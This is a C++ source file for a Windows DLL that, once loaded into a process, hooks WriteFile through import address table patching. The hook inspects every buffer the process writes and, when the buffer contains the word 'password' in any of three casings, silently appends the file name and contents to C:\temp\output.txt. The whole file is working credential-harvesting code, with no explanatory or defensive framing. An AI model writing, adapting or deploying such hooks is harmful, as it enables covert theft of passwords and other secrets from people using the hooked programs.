#include <Windows.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <tchar.h>
#include <string.h>
#include <psapi.h>
#include <strsafe.h>

#define BUFSIZE 512

#define IMPORT_TABLE_OFFSET 1

BOOL GetFileNameFromHandle(HANDLE hFile, TCHAR* out);

PIMAGE_IMPORT_DESCRIPTOR getImportTable(HMODULE hInstance)
{
	PIMAGE_DOS_HEADER dosHeader;
	IMAGE_OPTIONAL_HEADER optionalHeader;
	PIMAGE_NT_HEADERS ntHeader;
	IMAGE_DATA_DIRECTORY dataDirectory;

	dosHeader = (PIMAGE_DOS_HEADER)hInstance;
	ntHeader = (PIMAGE_NT_HEADERS)((PBYTE)dosHeader + dosHeader->e_lfanew);
    optionalHeader = (IMAGE_OPTIONAL_HEADER)(ntHeader->OptionalHeader);
	dataDirectory = (IMAGE_DATA_DIRECTORY)(optionalHeader.DataDirectory[IMPORT_TABLE_OFFSET]);
	return (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)hInstance + dataDirectory.VirtualAddress);
}


bool rewriteThunk(PIMAGE_THUNK_DATA pThunk, void* newFunc)
{
	DWORD CurrentProtect;
	DWORD junk;
	VirtualProtect(pThunk, 4096, PAGE_READWRITE, &CurrentProtect);
	pThunk->u1.Function = (DWORD)newFunc;
	VirtualProtect(pThunk, 4096, CurrentProtect, &junk);
	return true;
}


BOOL MyWriteFile(
	HANDLE       hFile,
	LPCVOID      lpBuffer,
	DWORD        nNumberOfBytesToWrite,
	LPDWORD      lpNumberOfBytesWritten,
	LPOVERLAPPED lpOverlapped
) {
    OutputDebugStringW(L"MyWriteFile");
    TCHAR* fileName = new TCHAR[MAX_PATH + 1];
    GetFileNameFromHandle(hFile, fileName);
    if((strstr((char *)lpBuffer, "password") != NULL) || 
        (strstr((char*)lpBuffer, "Password") != NULL) ||
        (strstr((char*)lpBuffer, "PASSWORD") != NULL)) {
        OutputDebugString("Found Password!");
        std::ofstream outFile;
        outFile.open("C:\\temp\\output.txt", std::fstream::app);
        outFile << "File name: " << fileName << std::endl;
        outFile << "Content:" << std::endl;
        outFile << (char*)lpBuffer << std::endl;
        
        delete []fileName;
    }

    return WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);
}

void patchIAT(char* funcNameToPatch, void* funcToRunInstead)
{
	HMODULE currentProcessImage = GetModuleHandleA(NULL);
	PIMAGE_IMPORT_DESCRIPTOR importedModule;
	PIMAGE_THUNK_DATA pFirstThunk, pOriginalFirstThunk;
	PIMAGE_IMPORT_BY_NAME pFuncData;
	importedModule = getImportTable(currentProcessImage);
	bool doneHooking = false;
	
	while (*(WORD*)importedModule != 0)
	{

		pFirstThunk = (PIMAGE_THUNK_DATA)((PBYTE)currentProcessImage + importedModule->FirstThunk);
		pOriginalFirstThunk = (PIMAGE_THUNK_DATA)((PBYTE)currentProcessImage + importedModule ->OriginalFirstThunk);
		pFuncData = (PIMAGE_IMPORT_BY_NAME)((PBYTE)currentProcessImage + pOriginalFirstThunk ->u1.AddressOfData);

        while (*(WORD*)pFirstThunk != 0 && *(WORD*)pOriginalFirstThunk != 0)
        {        	
            if (strcmp(funcNameToPatch, (char*)pFuncData->Name) == 0)
            {
                OutputDebugStringW(L"Hooking:");
				OutputDebugStringA(funcNameToPatch);
				if (rewriteThunk(pFirstThunk, funcToRunInstead))
				{
					OutputDebugStringW(L"Patch Successfully");
					doneHooking = true;
					break;
				}
			}

			pOriginalFirstThunk++;
			pFuncData = (PIMAGE_IMPORT_BY_NAME)((PBYTE)currentProcessImage + pOriginalFirstThunk ->u1.AddressOfData);
			pFirstThunk++;
		}
		if(doneHooking)
		{
			break;
		}
		importedModule++; //next module (DLL)
	}

	OutputDebugStringW(L"patchIAT end");
}

BOOL GetFileNameFromHandle(HANDLE hFile, TCHAR* out)
{
    BOOL bSuccess = FALSE;
    TCHAR pszFilename[MAX_PATH + 1];
    HANDLE hFileMap;

    // Get the file size.
    DWORD dwFileSizeHi = 0;
    DWORD dwFileSizeLo = GetFileSize(hFile, &dwFileSizeHi);

    if (dwFileSizeLo == 0 && dwFileSizeHi == 0)
    {
        _tprintf(TEXT("Cannot map a file with a length of zero.\n"));
        return FALSE;
    }

    // Create a file mapping object.
    hFileMap = CreateFileMapping(hFile,
        NULL,
        PAGE_READONLY,
        0,
        1,
        NULL);

    if (hFileMap)
    {
        // Create a file mapping to get the file name.
        void* pMem = MapViewOfFile(hFileMap, FILE_MAP_READ, 0, 0, 1);

        if (pMem)
        {
            if (GetMappedFileName(GetCurrentProcess(),
                pMem,
                pszFilename,
                MAX_PATH))
            {

                // Translate path with device name to drive letters.
                TCHAR szTemp[BUFSIZE];
                szTemp[0] = '\0';

                if (GetLogicalDriveStrings(BUFSIZE - 1, szTemp))
                {
                    TCHAR szName[MAX_PATH];
                    TCHAR szDrive[3] = TEXT(" :");
                    BOOL bFound = FALSE;
                    TCHAR* p = szTemp;

                    do
                    {
                        // Copy the drive letter to the template string
                        *szDrive = *p;

                        // Look up each device name
                        if (QueryDosDevice(szDrive, szName, MAX_PATH))
                        {
                            size_t uNameLen = _tcslen(szName);

                            if (uNameLen < MAX_PATH)
                            {
                                bFound = _tcsnicmp(pszFilename, szName, uNameLen) == 0
                                    && *(pszFilename + uNameLen) == _T('\\');

                                if (bFound)
                                {
                                    // Reconstruct pszFilename using szTempFile
                                    // Replace device path with DOS path
                                    TCHAR szTempFile[MAX_PATH];
                                    StringCchPrintf(szTempFile,
                                        MAX_PATH,
                                        TEXT("%s%s"),
                                        szDrive,
                                        pszFilename + uNameLen);
                                    StringCchCopyN(pszFilename, MAX_PATH + 1, szTempFile, _tcslen(szTempFile));
                                }
                            }
                        }

                        // Go to the next NULL character.
                        while (*p++);
                    } while (!bFound && *p); // end of string
                }
            }
            bSuccess = TRUE;
            UnmapViewOfFile(pMem);
        }

        CloseHandle(hFileMap);
    }

    memcpy(out, pszFilename, sizeof(TCHAR)* (MAX_PATH + 1));
    return TRUE;
}

BOOL APIENTRY DllMain(
    _In_ HINSTANCE hInst,
    _In_ DWORD     reason,
    _In_ LPVOID    reserved
) {
    switch (reason) {
		case DLL_PROCESS_ATTACH:
	    {	    
			OutputDebugStringW(L"DllMain");
			patchIAT("WriteFile", MyWriteFile);
			OutputDebugStringW(L"IATPatching DllMain end");
		}
		default: ;
    }

	
    return TRUE;
}
